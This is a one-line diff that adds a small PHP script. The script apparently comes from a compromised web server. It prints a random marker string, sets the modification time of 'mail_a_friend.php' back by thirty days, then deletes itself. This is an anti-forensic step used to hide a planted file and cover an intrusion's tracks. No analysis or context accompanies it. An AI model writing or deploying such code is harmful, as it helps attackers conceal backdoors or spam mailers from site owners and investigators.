@@ -1,0 +1,1 @@
+<?php echo "kWhCwSFXCA"; if (file_exists("./mail_a_friend.php")){ touch("./mail_a_friend.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*53w56FRpVbzCfxzMzzdE*/ ?>
